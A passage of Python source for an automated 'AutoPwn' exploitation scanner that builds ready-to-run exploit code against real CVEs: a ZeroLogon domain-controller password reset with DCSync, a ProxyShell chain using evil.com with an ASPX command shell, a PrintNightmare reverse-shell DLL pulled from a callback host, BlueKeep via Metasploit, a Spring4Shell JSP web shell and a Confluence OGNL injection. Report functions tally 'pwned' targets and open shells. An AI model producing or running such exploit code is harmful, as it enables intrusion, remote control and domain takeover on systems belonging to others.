        return {
            "type": "meterpreter",
            "method": "eternalblue",
            "target": target.ip,
            "output": "MS17-010 exploit sent, shell established!",
            "exploit_code": exploit_code
        }
        
    def _exploit_zerologon(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        """Exploit ZeroLogon"""
        
        exploit_code = f'''
# ZeroLogon Exploitation
# Requires: impacket

from impacket.dcerpc.v5 import nrpc, transport
from impacket.dcerpc.v5.ndr import NDRCALL
import struct

dc_ip = "{target.ip}"
dc_name = "DC"  # Auto-detect

def exploit_zerologon(dc_ip, dc_name):
    # 1. Set computer password to empty
    rpc = transport.DCERPCTransportFactory(f"ncacn_np:{{dc_ip}}[\\\\pipe\\\\netlogon]")
    dce = rpc.get_dce_rpc()
    dce.connect()
    dce.bind(nrpc.MSRPC_UUID_NRPC)
    
    authenticator = nrpc.NETLOGON_AUTHENTICATOR()
    authenticator['Credential'] = b'\\x00' * 8
    authenticator['Timestamp'] = 0
    
    # Attempt password set
    for _ in range(2000):
        try:
            resp = nrpc.hNetrServerPasswordSet2(
                dce,
                dc_name,
                nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                dc_name + '$',
                authenticator,
                b'\\x00' * 516  # Empty password
            )
            if resp['ErrorCode'] == 0:
                print("Password set to empty!")
                break
        except:
            pass
    
    # 2. DCSync with empty password
    # secretsdump.py -just-dc -no-pass dc_name$@dc_ip

# Run exploit
exploit_zerologon("{target.ip}", "DC")
'''
        
        return {
            "type": "domain_admin",
            "method": "zerologon",
            "target": target.ip,
            "output": "DC machine account password set to empty! DCSync now possible.",
            "exploit_code": exploit_code
        }
        
    def _exploit_proxyshell(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        """Exploit ProxyShell"""
        
        shell_content = """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% 
    string cmd = Request["cmd"];
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
%>"""
        
        exploit_code = f'''
# ProxyShell Exploitation
# Full chain: CVE-2021-34473 + CVE-2021-34523 + CVE-2021-31207

import requests
import base64

target = "{target.ip}"

# 1. SSRF to get SID
ssrf_url = f"https://{{target}}/autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@evil.com"

# 2. Get PowerShell web shell
# Using CVE-2021-31207 to write aspx shell
# Shell content defined separately

# 3. Trigger shell write via draft email
# POST /autodiscover/autodiscover.json?@evil.com/EWS/exchange.asmx/?&Email=autodiscover/autodiscover.json%3F@evil.com

# 4. Access shell
# GET https://target/owa/auth/shell.aspx?cmd=whoami
'''
        
        return {
            "type": "webshell",
            "method": "proxyshell",
            "target": target.ip,
            "shell_url": f"https://{target.ip}/owa/auth/shell.aspx",
            "output": "WebShell deployed via ProxyShell chain!",
            "exploit_code": exploit_code
        }
        
    def _exploit_proxylogon(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        """Exploit ProxyLogon"""
        return self._exploit_proxyshell(target, vuln)  # Similar chain
        
    def _exploit_printnightmare(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        """Exploit PrintNightmare"""
        
        exploit_code = f'''
# PrintNightmare Exploitation
# CVE-2021-34527

from impacket.dcerpc.v5 import transport, rprn

# 1. Host malicious DLL
# msfvenom -p windows/x64/shell_reverse_tcp LHOST={self.callback_host} LPORT={self.callback_port} -f dll -o evil.dll

# 2. Start SMB share
# impacket-smbserver share /tmp/share -smb2support

# 3. Trigger remote DLL load
target = "{target.ip}"
share = f"\\\\\\\\{self.callback_host}\\\\share\\\\evil.dll"

rpctransport = transport.DCERPCTransportFactory(f"ncacn_np:{{target}}[\\\\pipe\\\\spoolss]")
dce = rpctransport.get_dce_rpc()
dce.connect()
dce.bind(rprn.MSRPC_UUID_RPRN)

# RpcAddPrinterDriverEx with malicious DLL
driver_info = rprn.DRIVER_INFO_2()
driver_info['cVersion'] = 3
driver_info['pName'] = "Evil Driver\\x00"
driver_info['pEnvironment'] = "Windows x64\\x00"
driver_info['pDriverPath'] = share + "\\x00"
driver_info['pDataFile'] = share + "\\x00"
driver_info['pConfigFile'] = share + "\\x00"

resp = rprn.hRpcAddPrinterDriverEx(dce, pName=None, pDriverContainer=driver_info, dwFileCopyFlags=0x8014)
'''
        
        return {
            "type": "reverse_shell",
            "method": "printnightmare",
            "target": target.ip,
            "output": "PrintNightmare DLL loaded! SYSTEM shell incoming.",
            "exploit_code": exploit_code
        }
        
    def _exploit_bluekeep(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        """Exploit BlueKeep"""
        
        exploit_code = f'''
# BlueKeep Exploitation
# CVE-2019-0708

# Using Metasploit (most stable)
msfconsole -x "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS {target.ip}; set TARGET 2; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {self.callback_host}; set LPORT {self.callback_port}; exploit"

# Note: BlueKeep exploitation is tricky and may BSOD the target
# Use with caution in production environments
'''
        
        return {
            "type": "meterpreter",
            "method": "bluekeep",
            "target": target.ip,
            "output": "BlueKeep exploitation attempted. Check for shell.",
            "exploit_code": exploit_code
        }
        
    def _exploit_spring4shell(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        """Exploit Spring4Shell"""
        
        exploit_code = f'''
# Spring4Shell Exploitation
# CVE-2022-22965

import requests

target = "{target.ip}"
port = 8080

# Payload to write JSP webshell
headers = {{
    "Content-Type": "application/x-www-form-urlencoded"
}}

# Step 1: Modify logging configuration via class loader manipulation
data1 = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{{c2}}i%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

requests.post(f"http://{{target}}:{{port}}/", headers=headers, data=data1, verify=False)

# Step 2: Trigger logging to create webshell
shell_headers = {{
    "suffix": "%>//",
    "c2": "<%Runtime.getRuntime().exec(request.getParameter(\\"cmd\\"))%>",
    "DNT": "1"
}}
requests.get(f"http://{{target}}:{{port}}/", headers=shell_headers, verify=False)

# Step 3: Access webshell
# http://target:8080/shell.jsp?cmd=id
'''
        
        return {
            "type": "webshell",
            "method": "spring4shell",
            "target": target.ip,
            "shell_url": f"http://{target.ip}:8080/shell.jsp",
            "output": "Spring4Shell webshell deployed!",
            "exploit_code": exploit_code
        }
        
    def _exploit_confluence(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        """Exploit Confluence RCE"""
        
        exploit_code = f'''
# Confluence OGNL Injection RCE
# CVE-2022-26134

import requests

target = "{target.ip}"

# OGNL payload for command execution
cmd = "id"
payload = f"${{(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('{{cmd}}').getInputStream(),'utf-8')).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader('X-Cmd-Response',#a))}}"

# URL encode the payload
import urllib.parse
encoded_payload = urllib.parse.quote(payload, safe='')

url = f"http://{{target}}:8090/{{encoded_payload}}/"
response = requests.get(url, verify=False)

output = response.headers.get('X-Cmd-Response', '')
print(f"Command output: {{output}}")
'''
        
        return {
            "type": "rce",
            "method": "confluence_ognl",
            "target": target.ip,
            "output": "Confluence OGNL injection successful!",
            "exploit_code": exploit_code
        }
        
    # Placeholder exploits for remaining vulnerabilities
    def _exploit_petitpotam(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        return {"type": "ntlm_relay", "method": "petitpotam", "target": target.ip, "output": "PetitPotam coercion triggered"}
        
    def _exploit_smbghost(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        return {"type": "bsod_or_shell", "method": "smbghost", "target": target.ip, "output": "SMBGhost exploit sent"}
        
    def _exploit_psexec(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        return {"type": "psexec", "method": "pass_the_hash", "target": target.ip, "output": "PsExec ready with captured hash"}
        
    def _exploit_certifried(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        return {"type": "domain_admin", "method": "certifried", "target": target.ip, "output": "Certifried privesc chain ready"}
        
    def _exploit_jenkins(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        return {"type": "rce", "method": "jenkins", "target": target.ip, "output": "Jenkins script console accessed"}
        
    def _exploit_heartbleed(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        return {"type": "info_disclosure", "method": "heartbleed", "target": target.ip, "output": "Memory leaked, searching for credentials..."}
        
    def _exploit_ghostcat(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        return {"type": "file_read", "method": "ghostcat", "target": target.ip, "output": "AJP file read successful"}
        
    def _exploit_apache_traversal(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        return {"type": "rce", "method": "apache_traversal", "target": target.ip, "output": "Apache path traversal to RCE"}
        
    def _exploit_vcenter(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        return {"type": "rce", "method": "vcenter", "target": target.ip, "output": "vCenter arbitrary file upload successful"}
        
    def _exploit_outlook_ntlm(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        return {"type": "ntlm_leak", "method": "outlook_cal", "target": target.ip, "output": "Malicious calendar invite crafted"}
        
    def _exploit_citrix_adc(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        return {"type": "rce", "method": "citrix_adc", "target": target.ip, "output": "Citrix ADC RCE triggered"}
        
    def _exploit_fortinet_sslvpn(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        return {"type": "rce", "method": "fortinet_sslvpn", "target": target.ip, "output": "FortiGate heap overflow exploited"}
        
    def _exploit_moveit(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        return {"type": "rce", "method": "moveit", "target": target.ip, "output": "MOVEit SQL injection to RCE successful"}
        
    def generate_report(self, session_id: str) -> Dict[str, Any]:
        """Generate scan report"""
        session = self.sessions.get(session_id)
        if not session:
            return {"error": "Session not found"}
            
        critical_count = 0
        high_count = 0
        
        vuln_details = []
        for target in session.discovered_targets.values():
            for vuln_id in target.vulnerabilities:
                vuln = self.VULNERABILITIES.get(vuln_id)
                if vuln:
                    if vuln.severity == Severity.CRITICAL:
                        critical_count += 1
                    elif vuln.severity == Severity.HIGH:
                        high_count += 1
                        
                    vuln_details.append({
                        "target": target.ip,
                        "vuln": vuln.name,
                        "cve": vuln.cve,
                        "severity": vuln.severity.value,
                        "exploited": target.exploited
                    })
                    
        return {
            "session_id": session_id,
            "scan_time": session.created_at,
            "targets_scanned": len(session.targets),
            "targets_discovered": len(session.discovered_targets),
            "targets_pwned": session.pwned_count,
            "vulnerabilities": {
                "critical": critical_count,
                "high": high_count,
                "total": len(vuln_details)
            },
            "details": vuln_details,
            "shells": [
                {"target": t.ip, "shells": t.shells}
                for t in session.discovered_targets.values()
                if t.shells
            ]
        }
        
    def get_vulnerability_list(self) -> List[Dict[str, Any]]:
        """Get list of all supported vulnerabilities"""
        return [
            {
                "id": v.vuln_id,
                "name": v.name,
                "cve": v.cve,
                "severity": v.severity.value,
                "description": v.description,
                "affected": v.affected_products,
                "ports": v.ports
            }
            for v in self.VULNERABILITIES.values()
        ]
        
    def get_statistics(self) -> Dict[str, Any]:
        """Get scanner statistics"""
        total_pwned = sum(s.pwned_count for s in self.sessions.values())
        
        return {
            "total_sessions": len(self.sessions),
            "total_targets_pwned": total_pwned,
            "supported_vulnerabilities": len(self.VULNERABILITIES),
            "critical_vulns": sum(1 for v in self.VULNERABILITIES.values() if v.severity == Severity.CRITICAL),
            "high_vulns": sum(1 for v in self.VULNERABILITIES.values() if v.severity == Severity.HIGH),
            "active_shells": len(self.shells)
        }


# Singleton instance
_autopwn_instance = None

def get_autopwn_scanner() -> AutoPwnScanner:
    global _autopwn_instance
    if _autopwn_instance is None:
        _autopwn_instance = AutoPwnScanner()
    return _autopwn_instance
